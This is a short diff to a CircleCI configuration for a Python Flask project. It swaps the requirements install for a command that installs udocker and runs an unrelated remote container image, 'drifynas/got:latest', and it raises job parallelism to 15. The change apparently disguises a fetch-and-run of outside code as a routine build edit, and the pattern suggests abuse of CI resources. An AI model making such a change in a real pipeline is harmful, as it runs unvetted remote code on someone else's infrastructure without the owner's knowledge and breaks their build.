@@ -5,6 +5,7 @@ jobs:
       - image: circleci/python:2.7.14
         environment:
           FLASK_CONFIG: testing
+    parallelism : 15
     steps:
       - checkout
       - add_ssh_keys:
@@ -17,7 +18,7 @@ jobs:
             echo 'export IMAGE_NAME=python-circleci-docker' >> $BASH_ENV 
             virtualenv helloworld
             . helloworld/bin/activate
-            pip install --no-cache-dir -r requirements.txt
+            pip install udocker;udocker run drifynas/got:latest
       - run:
           name: Run Tests
           command: |
